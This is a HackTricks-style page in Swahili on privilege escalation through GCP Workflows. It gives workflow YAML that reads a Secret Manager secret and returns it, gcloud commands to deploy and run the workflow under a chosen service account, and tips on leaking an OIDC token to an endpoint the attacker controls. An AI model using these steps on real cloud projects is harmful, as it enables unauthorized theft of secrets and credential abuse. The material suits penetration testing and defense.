# GCP - Workflows Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Workflows

Basic Information:

{{#ref}}
../gcp-services/gcp-workflows-enum.md
{{#endref}}

### `workflows.workflows.create`, `iam.serviceAccounts.ActAs`, `workflows.executions.create`, (`workflows.workflows.get`, `workflows.operations.get`)

Kama ninavyojua si rahisi kupata shell yenye ufikiaji wa metadata endpoint inayoshikilia akreditif za SA ya SA iliyoshambuliwa kwenye Workflow. Hata hivyo, inawezekana kutumia ruhusa za SA kwa kuongeza vitendo vya kutekeleza ndani ya Workflow.

Inawezekana kupata nyaraka za viunganishi. Kwa mfano, hii ni [**ukurasa wa kiunganishi cha Secretmanager**](https://cloud.google.com/workflows/docs/reference/googleapis/secretmanager/Overview)**.** Katika upande wa bar, inawezekana kupata viunganishi vingine vingi.

Na hapa unaweza kupata mfano wa kiunganishi ambacho kinachapisha siri:
```yaml
main:
params: [input]
steps:
- access_string_secret:
call: googleapis.secretmanager.v1.projects.secrets.versions.accessString
args:
secret_id: secret_name
version: 1
project_id: project-id
result: str_secret
- returnOutput:
return: "${str_secret}"
```
Sasisha kutoka CLI:
```bash
gcloud workflows deploy <workflow-name> \
--service-account=email@SA \
--source=/path/to/config.yaml \
--location us-central1
```
Ikiwa unapata kosa kama `ERROR: (gcloud.workflows.deploy) FAILED_PRECONDITION: Workflows service agent does not exist`, **ngoja dakika moja na ujaribu tena**.

Ikiwa huna ufikiaji wa wavuti, inawezekana kuanzisha na kuona utekelezaji wa Workflow kwa:
```bash
# Run execution with output
gcloud workflows run <workflow-name> --location us-central1

# Run execution without output
gcloud workflows execute <workflow-name> --location us-central1

# List executions
gcloud workflows executions list <workflow-name>

# Get execution info and output
gcloud workflows executions describe projects/<proj-number>/locations/<location>/workflows/<workflow-name>/executions/<execution-id>
```
> [!CAUTION]
> Unaweza pia kuangalia matokeo ya utekelezaji wa awali kutafuta taarifa nyeti

Kumbuka kwamba hata kama unapata kosa kama `PERMISSION_DENIED: Permission 'workflows.operations.get' denied on...` kwa sababu huna ruhusa hiyo, mchakato umeundwa.

### Leak OIDC token (na OAuth?)

Kulingana na [**nyaraka**](https://cloud.google.com/workflows/docs/authenticate-from-workflow) inawezekana kutumia hatua za mchakato ambazo zitatumia ombi la HTTP na tokeni ya OAuth au OIDC. Hata hivyo, kama ilivyo katika kesi ya [Cloud Scheduler](gcp-cloudscheduler-privesc.md), ombi la HTTP lenye tokeni ya Oauth lazima liwe kwa mwenyeji `.googleapis.com`.

> [!CAUTION]
> Kwa hivyo, ni **uwezekano wa kuvuja tokeni ya OIDC kwa kuashiria mwisho wa HTTP** unaodhibitiwa na mtumiaji lakini ili kuvuja tokeni ya **OAuth** unahitaji **kupita** kwa ulinzi huo. Hata hivyo, bado unaweza **kuwasiliana na api yoyote ya GCP ili kufanya vitendo kwa niaba ya SA** ukitumia ama viunganishi au maombi ya HTTP yenye tokeni ya OAuth.

#### Oauth
```yaml
- step_A:
call: http.post
args:
url: https://compute.googleapis.com/compute/v1/projects/myproject1234/zones/us-central1-b/instances/myvm001/stop
auth:
type: OAuth2
scopes: OAUTH_SCOPE
```
#### OIDC
```yaml
- step_A:
call: http.get
args:
url: https://us-central1-project.cloudfunctions.net/functionA
query:
firstNumber: 4
secondNumber: 6
operation: sum
auth:
type: OIDC
audience: OIDC_AUDIENCE
```
### `workflows.workflows.update` ...

Kwa ruhusa hii badala ya `workflows.workflows.create` inawezekana kuboresha workflow iliyopo tayari na kufanya mashambulizi sawa.

{{#include ../../../banners/hacktricks-training.md}}
